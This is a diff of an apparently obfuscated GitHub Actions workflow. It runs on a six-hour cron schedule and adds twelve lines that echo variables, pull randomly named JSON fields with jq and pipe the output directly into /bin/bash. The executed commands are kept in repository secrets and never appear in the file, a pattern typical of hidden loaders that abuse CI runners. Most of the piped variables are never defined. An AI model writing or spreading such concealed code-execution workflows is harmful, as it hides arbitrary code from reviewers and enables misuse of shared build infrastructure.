@@ -2,19 +2,27 @@ name: wengjingshi1290
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 2/6 * * *'
+    - cron: '59 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wengjingshi1290
         env:
-          yoyr97399: ${{ secrets.yoyr97399 }}
+          ruppw81: ${{ secrets.ruppw81 }}
         run: |
-          echo $yoyr97399 | jq -r .q73 | /bin/bash
-          echo $q2008 | jq -r .nrt71 | /bin/bash
-          echo $lw0 | jq -r .vfoc23 | /bin/bash
-          echo $lgg4 | jq -r .d4764 | /bin/bash
+          echo $ruppw81 | jq -r .e50 | /bin/bash
+          echo $degs592 | jq -r .cjmi18473 | /bin/bash
+          echo $ae7 | jq -r .d067 | /bin/bash
+          echo $wd264 | jq -r .sb41 | /bin/bash
+          echo $ncq3 | jq -r .amvfd4919 | /bin/bash
+          echo $ax916 | jq -r .dzkjx47 | /bin/bash
+          echo $g7 | jq -r .iv91 | /bin/bash
+          echo $jk60341 | jq -r .jwe38004 | /bin/bash
+          echo $hb7 | jq -r .dob4478 | /bin/bash
+          echo $tpt6 | jq -r .i99 | /bin/bash
+          echo $h8 | jq -r .qjv7 | /bin/bash
+          echo $fgfa77872 | jq -r .m798 | /bin/bash
 
